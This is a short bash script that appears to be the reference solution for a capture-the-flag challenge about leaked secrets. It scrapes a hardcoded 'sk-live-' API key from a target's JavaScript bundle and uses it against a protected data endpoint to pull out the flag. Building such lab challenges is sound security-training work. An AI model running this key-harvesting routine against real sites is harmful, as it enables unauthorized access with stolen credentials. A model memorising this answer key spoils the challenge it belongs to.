#!/usr/bin/env bash
# Reference solve for C2 (secrets sprawl). The API key is hardcoded in the JS bundle;
# extract it and use it against the protected data endpoint.
set -euo pipefail
BASE="${1:-http://target:8080}"

echo "[*] recover the leaked API key from the JS bundle ->"
key="$(curl -s "$BASE/static/app.js" | grep -o 'sk-live-[A-Za-z0-9]*' | head -n1)"
echo "    key=$key"

echo "[*] use it against the protected data endpoint ->"
flag="$(curl -s -G "$BASE/api/data" --data-urlencode "key=$key" | grep -o 'PROMPTFOO{[^}]*}' | head -n1)"
[ -n "$flag" ] || { echo "[!] flag not recovered" >&2; exit 1; }
echo "$flag"
